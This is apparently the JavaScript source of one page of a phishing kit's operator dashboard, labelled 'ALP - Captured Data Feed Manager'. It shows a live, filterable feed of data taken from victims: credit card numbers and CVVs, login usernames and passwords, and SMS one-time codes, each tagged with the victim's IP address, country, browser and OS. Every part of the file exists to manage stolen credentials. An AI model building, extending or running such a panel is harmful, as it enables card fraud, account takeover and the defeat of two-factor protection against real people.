/**
 * ALP - Captured Data Feed Manager
 * Aggregated feed of logins, credentials, credit cards, and OTPs.
 */
const CapturedDataPage = (() => {
  let socketListeners = [];
  let refreshTimer = null;
  let allSessions = [];
  let websites = [];
  let currentFilter = 'all'; // 'all', 'cc', 'login', 'otp', 'other'
  let searchRaw = '';
  let selectedWebsiteId = '';

  function escapeHtml(s) {
    if (!s) return '';
    const d = document.createElement('div');
    d.textContent = String(s);
    return d.innerHTML;
  }

  function render() {
    return `
      <div class="captured-data-page page-enter">
        <div class="page-header">
          <div>
            <h1 class="page-title">Captured Data</h1>
            <p class="page-subtitle">Real-time aggregated feed of credentials, card details, and SMS OTP codes</p>
          </div>
        </div>

        <!-- Toolbar / Filters -->
        <div class="filter-bar" style="display:flex; flex-wrap:wrap; gap:16px; align-items:center; justify-content:space-between; margin-bottom:24px; padding:16px 20px; background:var(--bg-secondary); border:1px solid var(--border-primary); border-radius:12px;">
          <div style="display:flex; flex-wrap:wrap; gap:12px; align-items:center;">
            <!-- Website Selector -->
            <div style="display:flex; align-items:center; gap:8px;">
              <span style="font-size:11px; font-weight:700; color:var(--text-secondary); text-transform:uppercase; letter-spacing:0.5px;">Site:</span>
              <div id="data-website-container"></div>
            </div>

            <!-- Type Filters -->
            <div class="tab-filters" style="display:flex; background:rgba(0,0,0,0.2); border-radius:8px; padding:3px; gap:4px; border:1px solid var(--border-primary);">
              <button class="filter-tab active" data-filter="all" style="padding:6px 12px; border:none; border-radius:6px; font-size:12.5px; font-weight:500; cursor:pointer; font-family:Inter,sans-serif; background:none; color:var(--text-secondary); transition:all 0.15s;">All</button>
              <button class="filter-tab" data-filter="cc" style="padding:6px 12px; border:none; border-radius:6px; font-size:12.5px; font-weight:500; cursor:pointer; font-family:Inter,sans-serif; background:none; color:var(--text-secondary); transition:all 0.15s;">💳 Credit Cards</button>
              <button class="filter-tab" data-filter="login" style="padding:6px 12px; border:none; border-radius:6px; font-size:12.5px; font-weight:500; cursor:pointer; font-family:Inter,sans-serif; background:none; color:var(--text-secondary); transition:all 0.15s;">🔐 Credentials</button>
              <button class="filter-tab" data-filter="otp" style="padding:6px 12px; border:none; border-radius:6px; font-size:12.5px; font-weight:500; cursor:pointer; font-family:Inter,sans-serif; background:none; color:var(--text-secondary); transition:all 0.15s;">📱 OTP / SMS</button>
              <button class="filter-tab" data-filter="other" style="padding:6px 12px; border:none; border-radius:6px; font-size:12.5px; font-weight:500; cursor:pointer; font-family:Inter,sans-serif; background:none; color:var(--text-secondary); transition:all 0.15s;">📝 Other Forms</button>
            </div>
          </div>

          <!-- Search -->
          <div style="position:relative; width:260px;">
            <input type="text" id="data-search-input" placeholder="Search captured data..." class="form-input" style="height:34px; padding: 0 12px 0 32px; font-size:13px;" />
            <svg style="position:absolute; left:10px; top:50%; transform:translateY(-50%); color:var(--text-muted);" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
              <circle cx="11" cy="11" r="8"/><line x1="21" y1="21" x2="16.65" y2="16.65"/>
            </svg>
          </div>
        </div>

        <!-- Data Grid -->
        <div id="captured-data-grid" class="captured-grid" style="display:grid; grid-template-columns: repeat(auto-fill, minmax(340px, 1fr)); gap:20px;">
          <!-- Items will be populated here -->
          <div style="grid-column: 1 / -1; text-align:center; padding:60px; color:var(--text-tertiary);">
            <div class="spinner" style="margin: 0 auto 12px;"></div>
            Loading captured data feed…
          </div>
        </div>
      </div>

      <style>
        .filter-tab.active { background: var(--accent-primary) !important; color: #fff !important; }
        .filter-tab:hover:not(.active) { background: rgba(255,255,255,0.04); color: var(--text-primary); }
        .captured-card {
          background: var(--card-bg); border: 1px solid var(--border-color); border-radius: 14px;
          padding: 20px; display: flex; flex-direction: column; justify-content: space-between;
          box-shadow: var(--shadow-sm); transition: all 0.2s; position: relative; overflow: hidden;
          animation: fadeUp 0.3s ease both;
        }
        .captured-card:hover { border-color: rgba(99, 102, 241, 0.25); box-shadow: var(--shadow-md); transform: translateY(-2px); }
        .captured-card-header {
          display: flex; justify-content: space-between; align-items: flex-start;
          border-bottom: 1px solid rgba(255,255,255,0.04); padding-bottom: 12px; margin-bottom: 14px;
        }
        .card-badge-website {
          background: rgba(99, 102, 241, 0.12); color: #818cf8; font-size: 11px; font-weight: 600;
          padding: 3px 8px; border-radius: 6px; max-width: 140px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
        }
        .visitor-meta-line { font-size: 11.5px; color: var(--text-secondary); display: flex; align-items: center; gap: 6px; margin-top: 6px; }
        .visitor-flag { font-size: 13px; vertical-align: middle; }
        .captured-card-body { flex: 1; margin-bottom: 14px; min-height: 120px; }
        .captured-card-actions {
          display: flex; gap: 8px; border-top: 1px solid rgba(255,255,255,0.04); padding-top: 12px; margin-top: auto;
        }
        .card-action-btn {
          flex: 1; padding: 7px 12px; font-size: 11.5px; font-weight: 600; text-align: center;
          border-radius: 8px; cursor: pointer; font-family: Inter, sans-serif; display: flex;
          align-items: center; justify-content: center; gap: 6px; border: none; transition: all 0.15s;
        }
        .card-btn-view { background: rgba(99, 102, 241, 0.1); color: #818cf8; }
        .card-btn-view:hover { background: rgba(99, 102, 241, 0.18); }
        .card-btn-delete { background: rgba(239, 68, 68, 0.08); color: #f87171; }
        .card-btn-delete:hover { background: rgba(239, 68, 68, 0.15); }
      </style>
    `;
  }

  function getCapturedItems() {
    const items = [];
    allSessions.forEach(s => {
      let metadata = {};
      try {
        const raw = s.metadata;
        if (raw && typeof raw === 'object') {
          metadata = raw;
        } else if (typeof raw === 'string' && raw.trim()) {
          metadata = JSON.parse(raw);
        }
      } catch { metadata = {}; }

      if (metadata.formData && Array.isArray(metadata.formData)) {
        metadata.formData.forEach(entry => {
          const fields = entry.fields || {};
          const page = (entry.page || '').toLowerCase();
          
          let type = 'other';
          const keys = Object.keys(fields);
          const hasCCKeys = keys.some(k => ['card_number', 'ccnumb', 'card', 'cc_number', 'cardNumber', 'cvv', 'cccvv', 'cvc', 'security_code'].includes(k));
          if (page.includes('/cc') || hasCCKeys) {
            type = 'cc';
          } else if (page.includes('/login') || (keys.includes('email') && keys.includes('password')) || (keys.includes('username') && keys.includes('password'))) {
            type = 'login';
          } else if (page.includes('/otp') || keys.includes('otp_code') || keys.includes('code')) {
            type = 'otp';
          }

          items.push({
            session: s,
            entry: entry,
            type: type,
            timestamp: new Date(entry.timestamp || s.last_activity).getTime()
          });
        });
      }
    });

    items.sort((a, b) => b.timestamp - a.timestamp);
    return items;
  }

  function renderGrid() {
    const grid = document.getElementById('captured-data-grid');
    if (!grid) return;

    const items = getCapturedItems();

    const filtered = items.filter(item => {
      if (selectedWebsiteId && String(item.session.website_id) !== String(selectedWebsiteId)) {
        return false;
      }
      if (currentFilter !== 'all' && item.type !== currentFilter) {
        return false;
      }
      if (searchRaw) {
        const query = searchRaw.toLowerCase().trim();
        const ip = (item.session.ip_address || '').toLowerCase();
        const country = (item.session.country || '').toLowerCase();
        const city = (item.session.city || '').toLowerCase();
        const website = (item.session.website_name || '').toLowerCase();
        const page = (item.entry.page || '').toLowerCase();
        
        let fieldsMatch = false;
        for (const [k, v] of Object.entries(item.entry.fields || {})) {
          if (k.toLowerCase().includes(query) || String(v).toLowerCase().includes(query)) {
            fieldsMatch = true;
            break;
          }
        }

        if (!ip.includes(query) && !country.includes(query) && !city.includes(query) && !website.includes(query) && !page.includes(query) && !fieldsMatch) {
          return false;
        }
      }
      return true;
    });

    if (filtered.length === 0) {
      grid.innerHTML = `
        <div style="grid-column: 1 / -1; text-align:center; padding:60px 20px; color:var(--text-tertiary);">
          <div style="font-size:48px; margin-bottom:16px;">🔍</div>
          <p style="font-size:14px; font-weight:600; color:var(--text-secondary); margin:0 0 4px 0;">No Captured Data Found</p>
          <p style="font-size:12px; color:var(--text-muted); margin:0;">Try adjusting your filters or search query.</p>
        </div>
      `;
      return;
    }

    grid.innerHTML = filtered.map(item => {
      const s = item.session;
      const entry = item.entry;
      const timeStr = entry.timestamp ? new Date(entry.timestamp).toLocaleString() : new Date(s.last_activity).toLocaleString();
      const flagEmoji = s.country ? `<span class="visitor-flag" title="${escapeHtml(s.country)}">${SessionTemplates.countryFlag(s.country)}</span>` : '🌐';
      const browser = s.browser || 'Unknown';
      const os = s.os || 'Unknown';
      const bodyHtml = SessionTemplates.renderFormData({ formData: [entry] });

      return `
        <div class="captured-card" data-session-id="${s.id}">
          <div class="captured-card-header">
            <div>
              <span class="card-badge-website">${escapeHtml(s.website_name || 'Website')}</span>
              <div class="visitor-meta-line">
                ${flagEmoji}
                <strong style="color:var(--text-primary); font-family:monospace;">${escapeHtml(s.ip_address || '0.0.0.0')}</strong>
              </div>
              <div style="font-size:10px; color:var(--text-muted); margin-top:4px;">
                ${escapeHtml(browser)} on ${escapeHtml(os)}
              </div>
            </div>
            <div style="font-size:10.5px; color:var(--text-muted); font-style:italic; text-align:right;">
              ${timeStr.split(',')[1] || timeStr}
              <div style="font-size:9.5px; margin-top:4px; font-family:monospace;">${escapeHtml(s.id.slice(0, 8))}</div>
            </div>
          </div>
          <div class="captured-card-body">
            ${bodyHtml}
          </div>
          <div class="captured-card-actions">
            <button class="card-action-btn card-btn-view" data-sid="${s.id}">
              👁️ View Session
            </button>
            <button class="card-action-btn card-btn-delete" data-sid="${s.id}">
              🗑️ Delete
            </button>
          </div>
        </div>
      `;
    }).join('');

    // Attach click events
    grid.querySelectorAll('.card-btn-view').forEach(btn => {
      btn.addEventListener('click', (e) => {
        e.stopPropagation();
        window.SessionDrawer.open(btn.dataset.sid);
      });
    });

    grid.querySelectorAll('.card-btn-delete').forEach(btn => {
      btn.addEventListener('click', (e) => {
        e.stopPropagation();
        const sid = btn.dataset.sid;
        window.showModal({
          title: 'Delete Session',
          content: `<p>Are you sure you want to permanently delete session <strong>${sid.slice(0,8)}</strong>? All captured data and history will be lost.</p>`,
          type: 'danger',
          onConfirm: async () => {
            try {
              await window.ALPApi.deleteSession(sid);
              window.showToast('Session and captured data deleted', 'success');
              allSessions = allSessions.filter(item => item.session.id !== sid);
              renderGrid();
            } catch (err) { window.showToast('Failed to delete: ' + err.message, 'error'); }
          }
        });
      });
    });
  }

  async function loadWebsites() {
    try {
      const data = await window.ALPApi.getWebsites();
      websites = data.websites || data || [];
      
      window.ALPWebsiteSelect.create({
        containerId: 'data-website-container',
        hiddenInputId: 'data-website-select-hidden',
        websites: websites,
        placeholder: 'All Websites',
        selectedValue: selectedWebsiteId,
        onChange: (val) => {
          selectedWebsiteId = val;
          renderGrid();
        }
      });
    } catch (e) { console.error('Load websites:', e); }
  }

  async function loadSessions() {
    try {
      const data = await window.ALPApi.getSessions({ limit: 150 });
      allSessions = data.sessions || data || [];
      renderGrid();
    } catch (e) { console.error('Load sessions:', e); }
  }

  function init() {
    loadSessions();
    loadWebsites();

    // Auto-refresh timer
    refreshTimer = setInterval(loadSessions, 15000);

    // Tabs
    const tabs = document.querySelectorAll('.filter-tab');
    tabs.forEach(tab => {
      tab.addEventListener('click', () => {
        tabs.forEach(t => t.classList.remove('active'));
        tab.classList.add('active');
        currentFilter = tab.dataset.filter;
        renderGrid();
      });
    });

    // Search input
    const searchInput = document.getElementById('data-search-input');
    if (searchInput) {
      searchInput.addEventListener('input', (e) => {
        searchRaw = e.target.value;
        renderGrid();
      });
    }

    // Socket real-time events
    if (window.ALPSocket) {
      const onSessionUpdate = (session) => {
        const idx = allSessions.findIndex(s => s.id === session.id);
        if (idx >= 0) {
          allSessions[idx] = session;
        } else {
          allSessions.unshift(session);
        }
        renderGrid();
      };
      window.ALPSocket.on('admin:session:update', onSessionUpdate);
      socketListeners.push(['admin:session:update', onSessionUpdate]);

      const onNewSession = (session) => {
        const idx = allSessions.findIndex(s => s.id === session.id);
        if (idx < 0) {
          allSessions.unshift(session);
          renderGrid();
        }
      };
      window.ALPSocket.on('admin:session:new', onNewSession);
      socketListeners.push(['admin:session:new', onNewSession]);

      const onSessionEnd = (data) => {
        const idx = allSessions.findIndex(s => s.id === data.sessionId);
        if (idx >= 0) {
          allSessions[idx].is_active = false;
          renderGrid();
        }
      };
      window.ALPSocket.on('admin:session:end', onSessionEnd);
      socketListeners.push(['admin:session:end', onSessionEnd]);
    }
  }

  function destroy() {
    if (refreshTimer) { clearInterval(refreshTimer); refreshTimer = null; }
    if (window.ALPSocket) {
      socketListeners.forEach(([ev, fn]) => window.ALPSocket.off(ev, fn));
    }
    socketListeners = [];
    allSessions = [];
    websites = [];
  }

  return { render, init, destroy };
})();

if (typeof window !== 'undefined') {
  window.CapturedDataPage = CapturedDataPage;
}
